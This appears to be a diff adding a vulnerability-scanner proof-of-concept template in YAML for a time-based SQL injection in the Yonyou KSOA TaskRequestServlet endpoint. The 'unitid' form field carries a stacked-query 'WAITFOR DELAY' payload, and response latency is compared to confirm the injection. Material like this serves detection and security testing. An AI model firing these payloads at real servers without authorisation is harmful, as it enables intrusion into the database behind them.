@@ -1,0 +1,44 @@
+name: poc-yaml-yonyou-yonyou_ksoa-TaskRequestServlet-sqli
+manual: true
+transport: http
+set:
+    sleepSecond1: randomInt(6, 8)
+    sleepSecond2: randomInt(3, 5)
+rules:
+    r2:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:0%27--%20&password=
+            follow_redirects: false
+        expression: response.status == 200
+        output:
+            r0latency: response.latency
+    r3:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--%20&password=
+            follow_redirects: false
+        expression: response.status == 200 && response.latency - r0latency >= sleepSecond1 * 1000 - 1000
+    r4:
+        request:
+            cache: true
+            method: POST
+            path: /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:{{sleepSecond2}}%27--%20&password=
+            follow_redirects: false
+        expression: response.status == 200 && response.latency - r0latency >= sleepSecond2 * 1000 - 1000
+expression: r2() && r3() && r4()
+detail:
+    author: secking
+    links:
+        - https://www.yonyou.com/
